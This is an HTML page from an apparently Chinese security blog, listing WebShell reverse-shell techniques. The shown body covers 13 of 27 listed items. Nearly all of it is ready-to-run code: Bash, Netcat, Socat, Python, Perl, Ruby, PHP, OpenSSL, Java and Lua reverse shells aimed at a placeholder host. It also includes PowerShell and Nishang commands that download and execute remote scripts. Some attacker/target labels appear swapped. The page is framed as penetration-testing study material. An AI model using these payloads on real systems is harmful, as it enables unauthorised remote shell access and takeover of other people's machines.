@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>全面解析 27 种 WebShell 反弹技术 - 数字安全极客</title>
+
+  
+    <meta name="description" content="本文详细介绍了多达 27 种 WebShell 反弹技术，涵盖 Bash、Netcat、Python、Java 等多种编程语言实现的反弹方法，还包括利用系统工具、漏洞、计划任务等特殊途径进行反弹的操作。同时，为深入探索相关知识，提供了 aspx、ascx、ashx、asmx 等文件的技术研究链接。无论是网络安全从业者提升渗透测试技能，还是技术爱好者深入了解 WebShell 原理，本文都能提供丰富">
+<meta property="og:type" content="article">
+<meta property="og:title" content="全面解析 27 种 WebShell 反弹技术">
+<meta property="og:url" content="http://example.com/2021/09/01/rednote/Webshell/index.html">
+<meta property="og:site_name" content="数字安全极客">
+<meta property="og:description" content="本文详细介绍了多达 27 种 WebShell 反弹技术，涵盖 Bash、Netcat、Python、Java 等多种编程语言实现的反弹方法，还包括利用系统工具、漏洞、计划任务等特殊途径进行反弹的操作。同时，为深入探索相关知识，提供了 aspx、ascx、ashx、asmx 等文件的技术研究链接。无论是网络安全从业者提升渗透测试技能，还是技术爱好者深入了解 WebShell 原理，本文都能提供丰富">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-09-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-22T13:42:10.733Z">
+<meta property="article:author" content="SecAdmin">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="系统安全">
+<meta property="article:tag" content="WebShell">
+<meta name="twitter:card" content="summary">
+  
+  
+  
+  <meta name="keywords" content="网络安全,系统安全,WebShell">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="/assets/logo.ico">
+  
+
+  
+
+  
+
+
+  
+    
+      <link rel="preconnect" href="https://gcore.jsdelivr.net">
+    
+      <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.1.0/lxgwwenkaiscreen.css" media="all">
+    
+      <script>var _hmt = _hmt || [];(function() {  var hm = document.createElement("script");  hm.src = "https://hm.baidu.com/hm.js?471fac1b9a27585ef00b1647ef02618e";  var s = document.getElementsByTagName("script")[0];   s.parentNode.insertBefore(hm, s);})();</script>
+    
+      <!-- Google tag (gtag.js) --><script async src="https://www.googletagmanager.com/gtag/js?id=G-3CKX8MZFEY"></script><script>  window.dataLayer = window.dataLayer || [];  function gtag(){dataLayer.push(arguments);}  gtag('js', new Date());  gtag('config', 'G-3CKX8MZFEY');</script>
+    
+      <!-- Google ADS google.com/adsense/ --><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9718108884365672" crossorigin="anonymous"></script>
+    
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/assets/logo.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">数字安全极客</div><div class="sub normal cap">专注实战安全防御体系</div><div class="sub hover cap" style="opacity:0"> Digital Security Geek</div></a></div>
+
+<nav class="menu dis-select"></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">全面解析 27 种 WebShell 反弹技术</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Bash%E5%8F%8D%E5%BC%B9"><span class="toc-text">1. Bash反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Netcat%E5%8F%8D%E5%BC%B9"><span class="toc-text">2. Netcat反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Telnet%E5%8F%8D%E5%BC%B9"><span class="toc-text">3. Telnet反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Socat%E5%8F%8D%E5%BC%B9"><span class="toc-text">4. Socat反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Python%E5%8F%8D%E5%BC%B9"><span class="toc-text">5. Python反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Perl%E5%8F%8D%E5%BC%B9"><span class="toc-text">6. Perl反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Ruby%E5%8F%8D%E5%BC%B9"><span class="toc-text">7. Ruby反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-PHP%E5%8F%8D%E5%BC%B9"><span class="toc-text">8. PHP反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-Powershell%E5%8F%8D%E5%BC%B9%EF%BC%88Windows%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-text">9. Powershell反弹（Windows环境）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-OpenSSL%E5%8F%8D%E5%BC%B9"><span class="toc-text">10. OpenSSL反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-Java%E5%8F%8D%E5%BC%B9"><span class="toc-text">11. Java反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-Lua%E5%8F%8D%E5%BC%B9"><span class="toc-text">12. Lua反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-Nishang%E6%A1%86%E6%9E%B6%EF%BC%88PowerShell%EF%BC%89"><span class="toc-text">13. Nishang框架（PowerShell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E4%BD%BF%E7%94%A8Web%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">14. 使用Web服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%B7%A5%E5%85%B7%EF%BC%88%E5%A6%82curl%E6%88%96wget%EF%BC%89"><span class="toc-text">15. 利用系统工具（如curl或wget）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A6%82%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-text">16. 利用漏洞（如远程代码执行漏洞）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC"><span class="toc-text">17. 自定义脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-%E4%BD%BF%E7%94%A8Python%E7%9A%84pty%E5%BA%93%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">18. 使用Python的pty库模拟终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-%E5%88%A9%E7%94%A8Python%E7%9A%84paramiko%E5%BA%93%E8%BF%9B%E8%A1%8CSSH%E5%8F%8D%E5%BC%B9"><span class="toc-text">19. 利用Python的paramiko库进行SSH反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-%E4%BD%BF%E7%94%A8Perl%E7%9A%84IO-Socket%E6%A8%A1%E5%9D%97"><span class="toc-text">20. 使用Perl的IO::Socket模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%88%A9%E7%94%A8Java%E7%9A%84JSch%E5%BA%93%E8%BF%9B%E8%A1%8CSSH%E5%8F%8D%E5%BC%B9%EF%BC%88%E7%B1%BB%E4%BC%BCparamiko%EF%BC%89"><span class="toc-text">21. 利用Java的JSch库进行SSH反弹（类似paramiko）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E4%BD%BF%E7%94%A8Ruby%E7%9A%84drb%EF%BC%88Distributed-Ruby%EF%BC%89%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9"><span class="toc-text">22. 使用Ruby的drb（Distributed Ruby）进行反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%88%96cron%E4%BD%9C%E4%B8%9A"><span class="toc-text">23. 利用目标系统的计划任务或cron作业</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E4%BD%BF%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%88%96%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B"><span class="toc-text">24. 使用目标系统的服务或守护进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86"><span class="toc-text">25. 利用目标系统的漏洞利用工具集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-%E4%BD%BF%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E7%BD%AE%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%EF%BC%88%E5%A6%82Python%E3%80%81Perl%E7%AD%89%EF%BC%89%E7%9A%84Web%E6%8E%A5%E5%8F%A3"><span class="toc-text">26. 使用目标系统的内置脚本语言（如Python、Perl等）的Web接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8D%8F%E8%AE%AE%EF%BC%88%E5%A6%82RDP%E3%80%81VNC%E7%AD%89%EF%BC%89%E7%9A%84%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%8A%9F%E8%83%BD"><span class="toc-text">27. 利用目标系统的远程桌面协议（如RDP、VNC等）的反向连接功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aspx-ascx-ashx"><span class="toc-text">aspx,ascx,ashx</span></a></li></ol></div></div></widget>
+
+
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="/" rel="noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-house-fill" viewBox="0 0 16 16"><path d="M8.707 1.5a1 1 0 0 0-1.414 0L.646 8.146a.5.5 0 0 0 .708.708L8 2.207l6.646 6.647a.5.5 0 0 0 .708-.708L13 5.793V2.5a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0-.5.5v1.293L8.707 1.5Z"/> <path d="m8 3.293 6 6V13.5a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 13.5V9.293l6-6Z"/></svg></a><a class="social" href="https://github.com/seccmd" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/social/08a41b181ce68.svg"/></a><a class="social" href="https://twitter.com/sec_cmd" target="_blank" rel="external nofollow noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16">  <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/></svg></a><a class="social" href="https://123.seccmd.net" target="_blank" rel="external nofollow noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-tools" viewBox="0 0 16 16"><path d="M1 0 0 1l2.2 3.081a1 1 0 0 0 .815.419h.07a1 1 0 0 1 .708.293l2.675 2.675-2.617 2.654A3.003 3.003 0 0 0 0 13a3 3 0 1 0 5.878-.851l2.654-2.617.968.968-.305.914a1 1 0 0 0 .242 1.023l3.27 3.27a.997.997 0 0 0 1.414 0l1.586-1.586a.997.997 0 0 0 0-1.414l-3.27-3.27a1 1 0 0 0-1.023-.242L10.5 9.5l-.96-.96 2.68-2.643A3.005 3.005 0 0 0 16 3c0-.269-.035-.53-.102-.777l-2.14 2.141L12 4l-.364-1.757L13.777.102a3 3 0 0 0-3.675 3.68L7.462 6.46 4.793 3.793a1 1 0 0 1-.293-.707v-.071a1 1 0 0 0-.419-.814L1 0Zm9.646 10.646a.5.5 0 0 1 .708 0l2.914 2.915a.5.5 0 0 1-.707.707l-2.915-2.914a.5.5 0 0 1 0-.708ZM3 11l.471.242.529.026.287.445.445.287.026.529L5 13l-.242.471-.026.529-.445.287-.287.445-.529.026L3 15l-.471-.242L2 14.732l-.287-.445L1.268 14l-.026-.529L1 13l.242-.471.026-.529.445-.287.287-.445.529-.026L3 11Z"/></svg></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E6%94%BB%E9%98%B2%E5%85%BC%E5%A4%87/">攻防兼备</a></div><div id="post-meta">发布于&nbsp;<time datetime="2021-09-01T00:00:00.000Z">2021-09-01</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>全面解析 27 种 WebShell 反弹技术</span></h1>
+<h1 id="全面解析-27-种-WebShell-反弹技术"><a href="#全面解析-27-种-WebShell-反弹技术" class="headerlink" title="全面解析 27 种 WebShell 反弹技术"></a>全面解析 27 种 WebShell 反弹技术</h1><h3 id="1-Bash反弹"><a href="#1-Bash反弹" class="headerlink" title="1. Bash反弹"></a>1. Bash反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 攻击者主机上执行监听</span><br><span class="line">nc -lvvp port</span><br><span class="line"># 目标主机上执行</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Netcat反弹"><a href="#2-Netcat反弹" class="headerlink" title="2. Netcat反弹"></a>2. Netcat反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 攻击者主机上执行监听</span><br><span class="line">nc -lvvp port</span><br><span class="line"># 目标主机上执行</span><br><span class="line">nc -e /bin/bash x.x.x.x port</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Telnet反弹"><a href="#3-Telnet反弹" class="headerlink" title="3. Telnet反弹"></a>3. Telnet反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 攻击者主机上打开两个终端分别执行监听</span><br><span class="line">nc -lvvp 4444</span><br><span class="line">nc -lvvp 5555</span><br><span class="line"># 目标主机中执行</span><br><span class="line">telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Socat反弹"><a href="#4-Socat反弹" class="headerlink" title="4. Socat反弹"></a>4. Socat反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 攻击者主机上执行监听</span><br><span class="line">socat TCP-LISTEN:port,fork -</span><br><span class="line"># 目标主机上执行</span><br><span class="line">socat tcp-connect:x.x.x.x:port exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-Python反弹"><a href="#5-Python反弹" class="headerlink" title="5. Python反弹"></a>5. Python反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 目标主机上执行</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-Perl反弹"><a href="#6-Perl反弹" class="headerlink" title="6. Perl反弹"></a>6. Perl反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 目标主机上执行</span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;x.x.x.x&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-Ruby反弹"><a href="#7-Ruby反弹" class="headerlink" title="7. Ruby反弹"></a>7. Ruby反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 目标主机上执行</span><br><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-PHP反弹"><a href="#8-PHP反弹" class="headerlink" title="8. PHP反弹"></a>8. PHP反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 目标主机上执行（假设有Web服务器权限）</span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-Powershell反弹（Windows环境）"><a href="#9-Powershell反弹（Windows环境）" class="headerlink" title="9. Powershell反弹（Windows环境）"></a>9. Powershell反弹（Windows环境）</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 攻击者主机上执行监听（使用Powercat脚本）</span><br><span class="line">powershell IEX (New-Object System.Net.WebClient).DownloadString(&#x27;http://x.x.x.x:port/powercat.ps1&#x27;); powercat -c x.x.x.x -p port -e cmd</span><br><span class="line"># 目标主机上执行（假设可以下载并执行Powercat脚本）</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-OpenSSL反弹"><a href="#10-OpenSSL反弹" class="headerlink" title="10. OpenSSL反弹"></a>10. OpenSSL反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 这种方法利用OpenSSL生成自签名证书，并通过TLS/SSL隧道传输shell会话。</span><br><span class="line"># 攻击者主机上生成密钥并启用监听</span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port port</span><br><span class="line"># 目标主机上执行</span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect x.x.x.x:port &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="11-Java反弹"><a href="#11-Java反弹" class="headerlink" title="11. Java反弹"></a>11. Java反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.net.*;</span><br><span class="line">publicclassReverseShell&#123;</span><br><span class="line">publicstaticvoidmain(String[] args)&#123;</span><br><span class="line">Stringhost=&quot;x.x.x.x&quot;;// 攻击者IP</span><br><span class="line">intport=1234;// 监听端口</span><br><span class="line">try(Socketsocket=newSocket(host, port);</span><br><span class="line">BufferedReaderin=newBufferedReader(newInputStreamReader(socket.getInputStream()));</span><br><span class="line">PrintWriterout=newPrintWriter(socket.getOutputStream(),true);</span><br><span class="line">BufferedReaderstdIn=newBufferedReader(newInputStreamReader(System.in));</span><br><span class="line">BufferedWriterstdOut=newBufferedWriter(newOutputStreamWriter(System.out)))&#123;</span><br><span class="line">// 线程用于读取攻击者的命令并执行</span><br><span class="line">newThread(()-&gt;&#123;</span><br><span class="line">try&#123;</span><br><span class="line">String command;</span><br><span class="line">while((command = in.readLine())!=null)&#123;</span><br><span class="line">Processprocess=Runtime.getRuntime().exec(command);</span><br><span class="line">// 获取命令输出</span><br><span class="line">try(BufferedReaderprocessIn=newBufferedReader(newInputStreamReader(process.getInputStream()));</span><br><span class="line">BufferedReaderprocessError=newBufferedReader(newInputStreamReader(process.getErrorStream())))&#123;</span><br><span class="line">String line;</span><br><span class="line">while((line = processIn.readLine())!=null)&#123;</span><br><span class="line">                                out.println(line);</span><br><span class="line">&#125;</span><br><span class="line">while((line = processError.readLine())!=null)&#123;</span><br><span class="line">                                out.println(line);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;catch(Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;).start();</span><br><span class="line">// 线程用于将本地shell的输出发送到攻击者</span><br><span class="line">newThread(()-&gt;&#123;</span><br><span class="line">try&#123;</span><br><span class="line">String line;</span><br><span class="line">while((line = stdIn.readLine())!=null)&#123;</span><br><span class="line">                        out.println(line);</span><br><span class="line">&#125;</span><br><span class="line">&#125;catch(IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;).start();</span><br><span class="line">&#125;catch(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-Lua反弹"><a href="#12-Lua反弹" class="headerlink" title="12. Lua反弹"></a>12. Lua反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">local host =&quot;x.x.x.x&quot;</span><br><span class="line">local port =1234</span><br><span class="line">local socket =require(&quot;socket&quot;)</span><br><span class="line">local tcp = socket.tcp()</span><br><span class="line">tcp:connect(host, port)</span><br><span class="line">localfunction read_command()</span><br><span class="line">local command = tcp:receive(&quot;*l&quot;)</span><br><span class="line">return command</span><br><span class="line">end</span><br><span class="line">localfunction execute_command(command)</span><br><span class="line">local file =io.popen(command)</span><br><span class="line">localoutput= file:read(&quot;*all&quot;)</span><br><span class="line">    file:close()</span><br><span class="line">    tcp:send(output..&quot;\n&quot;)</span><br><span class="line">end</span><br><span class="line">whiletruedo</span><br><span class="line">local command = read_command()</span><br><span class="line">if command ==nilthenbreakend</span><br><span class="line">    execute_command(command)</span><br><span class="line">end</span><br><span class="line">tcp:close()</span><br></pre></td></tr></table></figure>
+
+<h3 id="13-Nishang框架（PowerShell）"><a href="#13-Nishang框架（PowerShell）" class="headerlink" title="13. Nishang框架（PowerShell）"></a>13. Nishang框架（PowerShell）</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在攻击者机器上监听</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://x.x.x.x/Invoke-PowerShellTcp.ps1&#x27;)</span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 1234</span><br><span class="line"># 在目标机器上执行（假设可以下载并执行脚本）</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://x.x.x.x/Invoke-ReverseTcpShell.ps1&#x27;)</span><br><span class="line">Invoke-ReverseTcpShell -IPAddress x.x.x.x -Port 1234</span><br></pre></td></tr></table></figure>
+
